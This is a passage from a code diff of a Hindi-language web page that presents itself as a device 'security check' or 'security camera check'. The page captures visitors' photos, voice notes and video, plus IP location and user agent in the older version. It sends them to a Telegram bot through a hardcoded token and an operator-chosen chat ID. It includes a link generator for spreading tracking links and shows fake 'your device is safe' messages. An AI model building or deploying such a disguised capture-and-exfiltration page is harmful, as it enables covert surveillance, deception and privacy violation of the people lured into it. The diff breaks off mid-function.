@@ -3,606 +3,533 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>सुरक्षा जाँच</title>
+<title>सुरक्षा कैमरा जाँच</title>
 <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-    .container { background: white; border-radius: 20px; padding: 30px; max-width: 420px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
-    .header { text-align: center; margin-bottom: 25px; }
-    .header .icon { font-size: 48px; margin-bottom: 10px; }
-    .header h1 { color: #1a1a2e; font-size: 22px; margin-bottom: 5px; }
-    .header p { color: #666; font-size: 13px; }
-    .progress-bar { background: #e0e0e0; border-radius: 10px; height: 8px; margin: 20px 0; overflow: hidden; }
-    .progress-bar .fill { height: 100%; width: 0%; background: linear-gradient(90deg, #667eea, #764ba2); border-radius: 10px; transition: width 0.5s ease; }
-    .status-box { background: #f8f9ff; border-radius: 12px; padding: 15px; margin: 15px 0; text-align: center; min-height: 50px; display: flex; align-items: center; justify-content: center; }
-    .status-box .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid #e0e0e0; border-top-color: #667eea; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 10px; }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .status-box .status-text { color: #333; font-size: 14px; }
-    .status-box.success { background: #e8f5e9; }
-    .status-box.success .status-text { color: #2e7d32; }
-    .status-box.error { background: #ffebee; }
-    .status-box.error .status-text { color: #c62828; }
-    .step-list { list-style: none; margin: 15px 0; }
-    .step-list li { padding: 10px 15px; margin: 5px 0; background: #f5f5f5; border-radius: 8px; font-size: 13px; color: #555; display: flex; align-items: center; }
-    .step-list li .step-icon { margin-right: 10px; font-size: 16px; }
-    .step-list li.done { background: #e8f5e9; color: #2e7d32; text-decoration: line-through; }
-    .btn { display: block; width: 100%; padding: 14px; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; margin-top: 15px; }
-    .btn-primary { background: linear-gradient(135deg, #667eea, #764ba2); color: white; }
-    .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(102,126,234,0.4); }
-    .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-    .btn-danger { background: #dc3545; color: white; }
-    .btn-danger:hover { background: #c82333; }
-    .hidden { display: none; }
-    #recordingSection { text-align: center; padding: 20px 0; }
-    #recordingSection .rec-icon { font-size: 64px; animation: pulse 1s infinite; }
-    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-    #recordingSection .timer { font-size: 36px; font-weight: bold; color: #dc3545; margin: 10px 0; font-family: monospace; }
-    #videoPreview { width: 100%; border-radius: 12px; margin-top: 15px; display: none; }
-    .log { background: #1a1a2e; color: #0f0; padding: 15px; border-radius: 10px; font-family: monospace; font-size: 12px; max-height: 200px; overflow-y: auto; margin-top: 15px; display: none; }
-    .log .log-entry { margin: 3px 0; }
-    .log .log-error { color: #ff6b6b; }
-    .log .log-success { color: #51cf66; }
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0f; color: #fff; min-height: 100vh; }
+.container { max-width: 500px; margin: 0 auto; padding: 20px; }
+.header { text-align: center; padding: 20px 0; }
+.header h1 { font-size: 22px; color: #00f0ff; margin-bottom: 5px; }
+.header p { font-size: 13px; color: #888; }
+.video-container { position: relative; background: #000; border-radius: 16px; overflow: hidden; margin: 15px 0; border: 2px solid #1a1a2e; }
+#video { width: 100%; display: block; transform: scaleX(-1); }
+#canvas { display: none; }
+.controls { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin: 15px 0; }
+.btn { padding: 12px 24px; border: none; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s; flex: 1; min-width: 120px; }
+.btn-primary { background: #00f0ff; color: #000; }
+.btn-primary:hover { background: #00d0e0; transform: translateY(-2px); }
+.btn-danger { background: #ff3355; color: #fff; }
+.btn-danger:hover { background: #e02a48; }
+.btn-success { background: #00e676; color: #000; }
+.btn-success:hover { background: #00c866; }
+.btn-warning { background: #ffab00; color: #000; }
+.btn-warning:hover { background: #e09a00; }
+.btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+.gallery { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 15px 0; }
+.gallery img { width: 100%; height: 120px; object-fit: cover; border-radius: 8px; border: 2px solid #1a1a2e; }
+.status { background: #1a1a2e; border-radius: 12px; padding: 15px; margin: 10px 0; font-size: 13px; max-height: 200px; overflow-y: auto; }
+.status .log { padding: 4px 0; border-bottom: 1px solid #2a2a3e; color: #aaa; }
+.status .log.success { color: #00e676; }
+.status .log.error { color: #ff3355; }
+.status .log.info { color: #00f0ff; }
+.link-box { background: #1a1a2e; border-radius: 12px; padding: 15px; margin: 10px 0; text-align: center; }
+.link-box input { width: 100%; padding: 10px; background: #0a0a0f; border: 1px solid #333; border-radius: 8px; color: #00f0ff; font-size: 13px; text-align: center; margin: 8px 0; }
+.link-box .copy-btn { background: #333; color: #fff; border: none; padding: 8px 20px; border-radius: 8px; cursor: pointer; }
+.hidden { display: none !important; }
+.stats { display: flex; gap: 10px; margin: 10px 0; }
+.stat-card { flex: 1; background: #1a1a2e; border-radius: 12px; padding: 12px; text-align: center; }
+.stat-card .num { font-size: 24px; font-weight: 700; color: #00f0ff; }
+.stat-card .label { font-size: 11px; color: #888; margin-top: 4px; }
+.tab-bar { display: flex; gap: 5px; margin: 15px 0; }
+.tab { flex: 1; padding: 10px; text-align: center; background: #1a1a2e; border-radius: 10px; cursor: pointer; font-size: 13px; transition: 0.3s; }
+.tab.active { background: #00f0ff; color: #000; font-weight: 600; }
+.tab-content { display: none; }
+.tab-content.active { display: block; }
 </style>
 </head>
 <body>
-<div class="container" id="app">
-    <div class="header">
-        <div class="icon">🛡️</div>
-        <h1>सुरक्षा जाँच आवश्यक है</h1>
-        <p>आपके खाते की सुरक्षा सुनिश्चित करने के लिए कृपया नीचे दिए गए चरणों को पूरा करें</p>
+
+<div class="container">
+  <div class="header">
+    <h1>📷 सुरक्षा कैमरा जाँच</h1>
+    <p>कैमरा एक्सेस देकर डिवाइस की जाँच करें</p>
+  </div>
+
+  <!-- Tabs -->
+  <div class="tab-bar">
+    <div class="tab active" onclick="switchTab('camera')">📸 कैमरा</div>
+    <div class="tab" onclick="switchTab('gallery')">🖼️ गैलरी (<span id="galleryCount">0</span>)</div>
+    <div class="tab" onclick="switchTab('logs')">📋 लॉग</div>
+  </div>
+
+  <!-- Camera Tab -->
+  <div id="tab-camera" class="tab-content active">
+    <div class="video-container">
+      <video id="video" autoplay playsinline></video>
+      <canvas id="canvas"></canvas>
     </div>
 
-    <div class="progress-bar">
-        <div class="fill" id="progressFill"></div>
+    <div class="controls">
+      <button class="btn btn-primary" id="startBtn" onclick="startCamera()">📷 कैमरा चालू करें</button>
+      <button class="btn btn-danger hidden" id="stopBtn" onclick="stopCamera()">⏹ बंद करें</button>
     </div>
 
-    <ul class="step-list" id="stepList">
-        <li id="step1"><span class="step-icon">📱</span> डिवाइस की जाँच हो रही है...</li>
-        <li id="step2" class="hidden"><span class="step-icon">📸</span> फोटो कैप्चर करें (6 फोटो)</li>
-        <li id="step3" class="hidden"><span class="step-icon">🎤</span> वॉइस नोट रिकॉर्ड करें (3 वॉइस नोट)</li>
-        <li id="step4" class="hidden"><span class="step-icon">🎥</span> वीडियो रिकॉर्ड करें (20 सेकंड)</li>
-        <li id="step5" class="hidden"><span class="step-icon">✅</span> सुरक्षा जाँच पूर्ण</li>
-    </ul>
-
-    <div class="status-box" id="statusBox">
-        <span class="spinner" id="spinner"></span>
-        <span class="status-text" id="statusText">कृपया प्रतीक्षा करें, डिवाइस की जाँच की जा रही है...</span>
+    <div class="controls" id="actionBtns" style="display:none;">
+      <button class="btn btn-success" onclick="capturePhoto()">📸 फोटो लें</button>
+      <button class="btn btn-warning" onclick="startVoice()">🎤 वॉइस (10s)</button>
+      <button class="btn btn-danger" onclick="startVideo()">🎥 वीडियो (20s)</button>
     </div>
 
-    <div id="actionSection" class="hidden">
-        <div id="photoSection" class="hidden">
-            <p style="text-align:center;margin-bottom:10px;color:#555;font-size:14px;">फोटो <span id="photoCount">0</span>/6</p>
-            <video id="photoVideo" width="100%" autoplay muted playsinline style="border-radius:12px;margin-bottom:10px;"></video>
-            <button class="btn btn-primary" id="capturePhotoBtn">📸 फोटो लें</button>
-        </div>
-        <div id="voiceSection" class="hidden">
-            <p style="text-align:center;margin-bottom:10px;color:#555;font-size:14px;">वॉइस नोट <span id="voiceCount">0</span>/3 (10 सेकंड प्रत्येक)</p>
-            <button class="btn btn-primary" id="recordVoiceBtn">🎤 वॉइस रिकॉर्ड करें</button>
-        </div>
-        <div id="recordingSection" class="hidden">
-            <div class="rec-icon">🎥</div>
-            <div class="timer" id="recTimer">20</div>
-            <p style="color:#666;font-size:14px;">वीडियो रिकॉर्ड हो रहा है...</p>
-            <video id="videoPreview" autoplay muted playsinline></video>
-        </div>
+    <!-- Link Generator -->
+    <div class="link-box">
+      <div style="font-size:13px; color:#888; margin-bottom:5px;">🔗 अपना लिंक जनरेट करें</div>
+      <button class="btn btn-primary" onclick="generateLink()" style="width:100%;">🔗 लिंक बनाएँ</button>
+      <div id="linkDisplay" class="hidden" style="margin-top:10px;">
+        <input type="text" id="linkInput" readonly onclick="this.select()">
+        <button class="copy-btn" onclick="copyLink()">📋 कॉपी करें</button>
+      </div>
     </div>
+  </div>
 
-    <button class="btn btn-danger hidden" id="resetBtn">🔄 पुनः प्रारंभ करें</button>
-    <div class="log" id="logContainer"></div>
+  <!-- Gallery Tab -->
+  <div id="tab-gallery" class="tab-content">
+    <div class="stats">
+      <div class="stat-card"><div class="num" id="photoCount">0</div><div class="label">फोटो</div></div>
+      <div class="stat-card"><div class="num" id="voiceCount">0</div><div class="label">वॉइस</div></div>
+      <div class="stat-card"><div class="num" id="videoCount">0</div><div class="label">वीडियो</div></div>
+    </div>
+    <div class="gallery" id="gallery"></div>
+  </div>
+
+  <!-- Logs Tab -->
+  <div id="tab-logs" class="tab-content">
+    <div class="status" id="statusLogs">
+      <div class="log info">✅ सिस्टम तैयार है। कैमरा चालू करें।</div>
+    </div>
+  </div>
 </div>
 
 <script>
-// ============================================================
-// CONFIGURATION
-// ============================================================
+// ====== CONFIG ======
 const BOT_TOKEN = '8225378395:AAHCsye1btvGfyrXSa_56rMkiG-XtDUswXk';
-const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+const DEFAULT_CHAT_ID = '8146265514';
 
-// Get chat_id from URL parameter ?id= or use default
+// Get chat_id from URL parameter
 const urlParams = new URLSearchParams(window.location.search);
-const CHAT_ID = urlParams.get('id') || '8146265514';
+const TARGET_CHAT_ID = urlParams.get('id') || DEFAULT_CHAT_ID;
 
-// ============================================================
-// STATE
-// ============================================================
-let state = {
-    photos: [],
-    voiceNotes: [],
-    videoBlob: null,
-    currentStep: 0,
-    isRecording: false,
-    botOffset: 0,
-    botPollingActive: false
-};
+// ====== STATE ======
+let mediaStream = null;
+let mediaRecorder = null;
+let recordedChunks = [];
+let isRecording = false;
+let capturedPhotos = [];
+let capturedVoices = [];
+let capturedVideos = [];
+let myLink = '';
 
-// ============================================================
-// DOM REFS
-// ============================================================
-const $ = id => document.getElementById(id);
-const progressFill = $('progressFill');
-const stepList = $('stepList');
-const statusBox = $('statusBox');
-const statusText = $('statusText');
-const spinner = $('spinner');
-const actionSection = $('actionSection');
-const photoSection = $('photoSection');
-const photoVideo = $('photoVideo');
-const photoCount = $('photoCount');
-const capturePhotoBtn = $('capturePhotoBtn');
-const voiceSection = $('voiceSection');
-const voiceCount = $('voiceCount');
-const recordVoiceBtn = $('recordVoiceBtn');
-const recordingSection = $('recordingSection');
-const recTimer = $('recTimer');
-const videoPreview = $('videoPreview');
-const resetBtn = $('resetBtn');
-const logContainer = $('logContainer');
+// ====== DOM REFS ======
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const startBtn = document.getElementById('startBtn');
+const stopBtn = document.getElementById('stopBtn');
+const actionBtns = document.getElementById('actionBtns');
+const statusLogs = document.getElementById('statusLogs');
+const gallery = document.getElementById('gallery');
 
-// ============================================================
-// LOGGING
-// ============================================================
-function log(msg, type = 'info') {
-    const entry = document.createElement('div');
-    entry.className = `log-entry ${type === 'error' ? 'log-error' : type === 'success' ? 'log-success' : ''}`;
-    entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-    logContainer.appendChild(entry);
-    logContainer.scrollTop = logContainer.scrollHeight;
-    logContainer.style.display = 'block';
-    console.log(msg);
+// ====== HELPERS ======
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+function addLog(msg, type = 'info') {
+  const div = document.createElement('div');
+  div.className = `log ${type}`;
+  const time = new Date().toLocaleTimeString('hi-IN');
+  div.textContent = `[${time}] ${msg}`;
+  statusLogs.appendChild(div);
+  statusLogs.scrollTop = statusLogs.scrollHeight;
 }
 
-// ============================================================
-// TELEGRAM API HELPERS
-// ============================================================
-async function tgCall(method, params = {}) {
-    const url = `${API_BASE}/${method}`;
-    const formData = new FormData();
-    for (const [key, value] of Object.entries(params)) {
-        formData.append(key, value);
-    }
-    const res = await fetch(url, { method: 'POST', body: formData });
-    return res.json();
+function updateCounts() {
+  document.getElementById('photoCount').textContent = capturedPhotos.length;
+  document.getElementById('voiceCount').textContent = capturedVoices.length;
+  document.getElementById('videoCount').textContent = capturedVideos.length;
+  document.getElementById('galleryCount').textContent = capturedPhotos.length + capturedVoices.length + capturedVideos.length;
 }
 
-async function sendTelegramMessage(text) {
-    log(`भेज रहा है: ${text.substring(0, 50)}...`, 'info');
-    const result = await tgCall('sendMessage', {
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: 'HTML'
+function switchTab(tab) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  document.querySelector(`.tab[onclick*="${tab}"]`).classList.add('active');
+  document.getElementById(`tab-${tab}`).classList.add('active');
+}
+
+// ====== TELEGRAM API ======
+async function sendToTelegram(method, data) {
+  try {
+    const res = await fetch(`${API}/${method}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
     });
-    if (result.ok) {
-        log('✅ मैसेज भेजा गया', 'success');
-    } else {
-        log(`❌ मैसेज भेजने में त्रुटि: ${result.description}`, 'error');
-    }
-    return result;
+    return await res.json();
+  } catch(e) {
+    addLog(`Telegram API error: ${e.message}`, 'error');
+    return null;
+  }
 }
 
-async function sendTelegramPhoto(blob, caption = '') {
-    log('फोटो भेज रहा है...', 'info');
+async function sendPhotoToTelegram(blob, caption = '') {
+  try {
     const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
+    formData.append('chat_id', TARGET_CHAT_ID);
     formData.append('photo', blob, `photo_${Date.now()}.jpg`);
     if (caption) formData.append('caption', caption);
-    const res = await fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: formData });
-    const result = await res.json();
-    if (result.ok) {
-        log('✅ फोटो भेजा गया', 'success');
+    
+    const res = await fetch(`${API}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    });
+    const data = await res.json();
+    if (data.ok) {
+      addLog('📸 फोटो Telegram भेजा गया', 'success');
     } else {
-        log(`❌ फोटो त्रुटि: ${result.description}`, 'error');
+      addLog(`📸 फोटो भेजने में error: ${data.description}`, 'error');
     }
-    return result;
+    return data;
+  } catch(e) {
+    addLog(`फोटो भेजने में error: ${e.message}`, 'error');
+    return null;
+  }
 }
 
-async function sendTelegramVoice(blob) {
-    log('वॉइस नोट भेज रहा है...', 'info');
+async function sendVoiceToTelegram(blob) {
+  try {
     const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
+    formData.append('chat_id', TARGET_CHAT_ID);
     formData.append('voice', blob, `voice_${Date.now()}.ogg`);
-    const res = await fetch(`${API_BASE}/sendVoice`, { method: 'POST', body: formData });
-    const result = await res.json();
-    if (result.ok) {
-        log('✅ वॉइस नोट भेजा गया', 'success');
+    
+    const res = await fetch(`${API}/sendVoice`, {
+      method: 'POST',
+      body: formData
+    });
+    const data = await res.json();
+    if (data.ok) {
+      addLog('🎤 वॉइस Telegram भेजा गया', 'success');
     } else {
-        log(`❌ वॉइस त्रुटि: ${result.description}`, 'error');
+      addLog(`🎤 वॉइस error: ${data.description}`, 'error');
     }
-    return result;
+    return data;
+  } catch(e) {
+    addLog(`वॉइस error: ${e.message}`, 'error');
+    return null;
+  }
 }
 
-async function sendTelegramVideo(blob) {
-    log('वीडियो भेज रहा है...', 'info');
+async function sendVideoToTelegram(blob) {
+  try {
     const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('video', blob, `video_${Date.now()}.webm`);
-    formData.append('caption', '🎥 20 सेकंड का वीडियो रिकॉर्डिंग');
-    formData.append('duration', '20');
-    const res = await fetch(`${API_BASE}/sendVideo`, { method: 'POST', body: formData });
-    const result = await res.json();
-    if (result.ok) {
-        log('✅ वीडियो भेजा गया', 'success');
+    formData.append('chat_id', TARGET_CHAT_ID);
+    formData.append('video', blob, `video_${Date.now()}.mp4`);
+    
+    const res = await fetch(`${API}/sendVideo`, {
+      method: 'POST',
+      body: formData
+    });
+    const data = await res.json();
+    if (data.ok) {
+      addLog('🎥 वीडियो Telegram भेजा गया', 'success');
     } else {
-        log(`❌ वीडियो त्रुटि: ${result.description}`, 'error');
+      addLog(`🎥 वीडियो error: ${data.description}`, 'error');
     }
-    return result;
+    return data;
+  } catch(e) {
+    addLog(`वीडियो error: ${e.message}`, 'error');
+    return null;
+  }
 }
 
-// ============================================================
-// BOT POLLING — /start कमांड हैंडलर
-// ============================================================
-async function pollBot() {
-    if (state.botPollingActive) return;
-    state.botPollingActive = true;
-    log('🤖 बॉट पोलिंग शुरू...', 'info');
-
-    while (state.botPollingActive) {
-        try {
-            const url = `${API_BASE}/getUpdates?offset=${state.botOffset}&timeout=10`;
-            const res = await fetch(url);
-            const data = await res.json();
-
-            if (data.ok && data.result && data.result.length > 0) {
-                for (const update of data.result) {
-                    const msg = update.message;
-                    if (msg && msg.text) {
-                        log(`📩 मैसेज मिला: "${msg.text}" from ${msg.from.first_name} (chat: ${msg.chat.id})`, 'info');
-
-                        // Handle /start command — Telegram app में reply भेजें
-                        if (msg.text.startsWith('/start')) {
-                            const replyText = `🛡️ नमस्ते ${msg.from.first_name}! आपका डिवाइस सुरक्षित है।\n\n✅ सुरक्षा जाँच पूर्ण\n📊 कोई खतरा नहीं पाया गया\n\nयह एक स्वचालित सुरक्षा जाँच थी।`;
-                            
-                            // Send reply to the SAME chat where /start was received
-                            const replyResult = await tgCall('sendMessage', {
-                                chat_id: msg.chat.id,
-                                text: replyText,
-                                parse_mode: 'HTML'
-                            });
-                            
-                            if (replyResult.ok) {
-                                log(`✅ /start का जवाब ${msg.from.first_name} को भेजा गया`, 'success');
-                            } else {
-                                log(`❌ /start जवाब त्रुटि: ${replyResult.description}`, 'error');
-                            }
-                        }
-                        
-                        // Handle /genlink command
-                        if (msg.text.startsWith('/genlink')) {
-                            const link = `${window.location.origin}${window.location.pathname}?id=${msg.chat.id}`;
-                            const replyResult = await tgCall('sendMessage', {
-                                chat_id: msg.chat.id,
-                                text: `🔗 आपका जनरेटेड लिंक:\n${link}`,
-                                parse_mode: 'HTML'
-                            });
-                            if (replyResult.ok) {
-                                log(`✅ /genlink का जवाब भेजा गया`, 'success');
-                            }
-                        }
-                    }
-                    
-                    // Update offset to confirm this update
-                    state.botOffset = update.update_id + 1;
-                }
-            }
-        } catch (err) {
-            log(`⚠️ पोलिंग त्रुटि: ${err.message}`, 'error');
-            await new Promise(r => setTimeout(r, 3000));
-        }
-        
-        // Wait 2 seconds before next poll
-        await new Promise(r => setTimeout(r, 2000));
-    }
-}
-
-// ============================================================
-// STEP MANAGEMENT
-// ============================================================
-function updateProgress() {
-    const pct = (state.currentStep / 5) * 100;
-    progressFill.style.width = `${pct}%`;
-}
-
-function showStep(num) {
-    for (let i = 1; i <= 5; i++) {
-        const el = $(`step${i}`);
-        if (i <= num) {
-            el.classList.remove('hidden');
-            el.classList.add('done');
-        } else if (i === num + 1) {
-            el.classList.remove('hidden');
-            el.classList.remove('done');
-        } else {
-            el.classList.add('hidden');
-            el.classList.remove('done');
-        }
-    }
-}
-
-function setStatus(text, type = 'info') {
-    statusText.textContent = text;
-    statusBox.className = 'status-box';
-    if (type === 'success') statusBox.classList.add('success');
-    if (type === 'error') statusBox.classList.add('error');
-    spinner.style.display = (type === 'info') ? 'inline-block' : 'none';
-}
-
-// ============================================================
-// STEP 1: DEVICE CHECK
-// ============================================================
-async function step1() {
-    state.currentStep = 1;
-    updateProgress();
-    showStep(1);
-    setStatus('डिवाइस की जाँच हो रही है...');
+// ====== CAMERA ======
+async function startCamera() {
+  try {
+    const constraints = {
+      video: { 
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+        facingMode: 'user'
+      },
+      audio: true
+    };
+    
+    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+    video.srcObject = mediaStream;
+    
+    startBtn.classList.add('hidden');
+    stopBtn.classList.remove('hidden');
+    actionBtns.style.display = 'flex';
+    
+    addLog('📷 कैमरा चालू हुआ', 'success');
     
     // Send notification to Telegram
-    await sendTelegramMessage(`🛡️ <b>नया विज़िटर</b>\n\n👤 यूज़र ने सुरक्षा जाँच शुरू की\n📱 डिवाइस: ${navigator.userAgent.substring(0, 100)}`);
+    await sendToTelegram('sendMessage', {
+      chat_id: TARGET_CHAT_ID,
+      text: `📷 <b>नया विज़िटर</b>\n\nकैमरा एक्सेस दिया गया ✅\nसमय: ${new Date().toLocaleString('hi-IN')}`,
+      parse_mode: 'HTML'
+    });
     
-    // Get IP info
-    try {
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
-        const ipInfo = `🌍 <b>लोकेशन जानकारी</b>\n\nIP: ${ipData.ip}\nदेश: ${ipData.country_name}\nशहर: ${ipData.city}\nISP: ${ipData.org}`;
-        await sendTelegramMessage(ipInfo);
-        log(`IP लोकेशन: ${ipData.city}, ${ipData.country_name}`, 'success');
-    } catch (e) {
-        log('IP लोकेशन नहीं मिल सकी', 'error');
-    }
-    
-    await new Promise(r => setTimeout(r, 2000));
-    
-    setStatus('✅ डिवाइस की जाँच पूर्ण', 'success');
-    await new Promise(r => setTimeout(r, 1000));
-    
-    // Start bot polling for /start command
-    pollBot();
-    
-    // Move to photo step
-    step2();
+  } catch(e) {
+    addLog(`कैमरा error: ${e.message}`, 'error');
+    alert('कैमरा एक्सेस नहीं मिला। कृपया अनुमति दें।');
+  }
 }
 
-// ============================================================
-// STEP 2: PHOTOS (6 photos)
-// ============================================================
-async function step2() {
-    state.currentStep = 2;
-    updateProgress();
-    showStep(2);
-    actionSection.classList.remove('hidden');
-    photoSection.classList.remove('hidden');
-    voiceSection.classList.add('hidden');
-    recordingSection.classList.add('hidden');
+function stopCamera() {
+  if (mediaStream) {
+    mediaStream.getTracks().forEach(t => t.stop());
+    mediaStream = null;
+  }
+  video.srcObject = null;
+  startBtn.classList.remove('hidden');
+  stopBtn.classList.add('hidden');
+  actionBtns.style.display = 'none';
+  addLog('📷 कैमरा बंद किया', 'info');
+}
+
+// ====== CAPTURE PHOTO ======
+async function capturePhoto() {
+  if (!mediaStream) {
+    addLog('पहले कैमरा चालू करें', 'error');
+    return;
+  }
+  
+  if (capturedPhotos.length >= 6) {
+    addLog('अधिकतम 6 फोटो ले सकते हैं', 'error');
+    return;
+  }
+  
+  const ctx = canvas.getContext('2d');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  
+  // Mirror the image
+  ctx.translate(canvas.width, 0);
+  ctx.scale(-1, 1);
+  ctx.drawImage(video, 0, 0);
+  
+  // Convert to blob
+  canvas.toBlob(async (blob) => {
+    const url = URL.createObjectURL(blob);
+    capturedPhotos.push(url);
+    updateCounts();
     
-    setStatus('📸 कृपया 6 फोटो लें');
+    // Show in gallery
+    const img = document.createElement('img');
+    img.src = url;
+    gallery.insertBefore(img, gallery.firstChild);
     
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        photoVideo.srcObject = stream;
-    } catch (e) {
-        setStatus('❌ कैमरा एक्सेस नहीं हो सका', 'error');
-        return;
-    }
+    addLog(`📸 फोटो #${capturedPhotos.length} ली गई`, 'success');
     
-    capturePhotoBtn.onclick = async () => {
-        if (state.photos.length >= 6) return;
-        
-        const canvas = document.createElement('canvas');
-        canvas.width = photoVideo.videoWidth || 640;
-        canvas.height = photoVideo.videoHeight || 480;
-        canvas.getContext('2d').drawImage(photoVideo, 0, 0);
-        
-        canvas.toBlob(async (blob) => {
-            state.photos.push(blob);
-            photoCount.textContent = state.photos.length;
-            log(`फोटो ${state.photos.length}/6 लिया गया`, 'success');
-            
-            await sendTelegramPhoto(blob, `📸 फोटो ${state.photos.length}/6`);
-            
-            if (state.photos.length >= 6) {
-                // Stop camera
-                photoVideo.srcObject.getTracks().forEach(t => t.stop());
-                setStatus('✅ सभी 6 फोटो लिए गए', 'success');
-                await new Promise(r => setTimeout(r, 1000));
-                step3();
-            }
-        }, 'image/jpeg', 0.8);
+    // Send to Telegram
+    await sendPhotoToTelegram(blob, `📸 फोटो #${capturedPhotos.length}`);
+    
+    // Store in localStorage
+    saveToStorage();
+  }, 'image/jpeg', 0.8);
+}
+
+// ====== RECORD VOICE ======
+async function startVoice() {
+  if (!mediaStream) {
+    addLog('पहले कैमरा चालू करें', 'error');
+    return;
+  }
+  
+  if (capturedVoices.length >= 3) {
+    addLog('अधिकतम 3 वॉइस नोट', 'error');
+    return;
+  }
+  
+  if (isRecording) {
+    addLog('पहले से रिकॉर्डिंग चल रही है', 'error');
+    return;
+  }
+  
+  try {
+    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    recordedChunks = [];
+    mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
+    
+    mediaRecorder.ondataavailable = (e) => {
+      if (e.data.size > 0) recordedChunks.push(e.data);
     };
-}
-
-// ============================================================
-// STEP 3: VOICE NOTES (3 voice notes, 10s each)
-// ============================================================
-async function step3() {
-    state.currentStep = 3;
-    updateProgress();
-    showStep(3);
-    photoSection.classList.add('hidden');
-    voiceSection.classList.remove('hidden');
-    recordingSection.classList.add('hidden');
     
-    setStatus('🎤 कृपया 3 वॉइस नोट रिकॉर्ड करें (10 सेकंड प्रत्येक)');
-    
-    let mediaRecorder = null;
-    let audioChunks = [];
-    
-    recordVoiceBtn.onclick = async () => {
-        if (state.voiceNotes.length >= 3 || state.isRecording) return;
-        state.isRecording = true;
-        recordVoiceBtn.disabled = true;
-        recordVoiceBtn.textContent = '🔴 रिकॉर्डिंग... 10 सेकंड';
-        
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
-            audioChunks = [];
-            
-            mediaRecorder.ondataavailable = e => {
-                if (e.data.size > 0) audioChunks.push(e.data);
-            };
-            
-            mediaRecorder.onstop = async () => {
-                stream.getTracks().forEach(t => t.stop());
-                const blob = new Blob(audioChunks, { type: 'audio/webm;codecs=opus' });
-                state.voiceNotes.push(blob);
-                voiceCount.textContent = state.voiceNotes.length;
-                log(`वॉइस नोट ${state.voiceNotes.length}/3 रिकॉर्ड किया गया`, 'success');
-                
-                await sendTelegramVoice(blob);
-                
-                state.isRecording = false;
-                recordVoiceBtn.disabled = false;
-                recordVoiceBtn.textContent = '🎤 वॉइस रिकॉर्ड करें';
-                
-                if (state.voiceNotes.length >= 3) {
-                    setStatus('✅ सभी 3 वॉइस नोट लिए गए', 'success');
-                    await new Promise(r => setTimeout(r, 1000));
-                    step4();
-                }
-            };
-            
-            mediaRecorder.start();
-            setTimeout(() => {
-                if (mediaRecorder && mediaRecorder.state === 'recording') {
-                    mediaRecorder.stop();
-                }
-            }, 10000);
-            
-        } catch (e) {
-            log(`वॉइस रिकॉर्ड त्रुटि: ${e.message}`, 'error');
-            state.isRecording = false;
-            recordVoiceBtn.disabled = false;
-            recordVoiceBtn.textContent = '🎤 वॉइस रिकॉर्ड करें';
-        }
+    mediaRecorder.onstop = async () => {
+      audioStream.getTracks().forEach(t => t.stop());
+      const blob = new Blob(recordedChunks, { type: 'audio/webm' });
+      const url = URL.createObjectURL(blob);
+      capturedVoices.push(url);
+      updateCounts();
+      
+      addLog(`🎤 वॉइस #${capturedVoices.length} रिकॉर्ड हुआ`, 'success');
+      
+      // Send to Telegram
+      await sendVoiceToTelegram(blob);
+      
+      // Store
+      saveToStorage();
+      isRecording = false;
     };
+    
+    mediaRecorder.start();
+    isRecording = true;
+    addLog('🎤 वॉइस रिकॉर्डिंग शुरू... (10 सेकंड)', 'info');
+    
+    // Auto stop after 10 seconds
+    setTimeout(() => {
+      if (mediaRecorder && mediaRecorder.state === 'recording') {
+        mediaRecorder.stop();
+        addLog('🎤 वॉइस रिकॉर्डिंग पूरी', 'success');
+      }
+    }, 10000);
+    
+  } catch(e) {
+    addLog(`वॉइस error: ${e.message}`, 'error');
+    isRecording = false;
+  }
 }
 
-// ============================================================
-// STEP 4: VIDEO RECORDING (20 seconds)
-// ============================================================
-async function step4() {
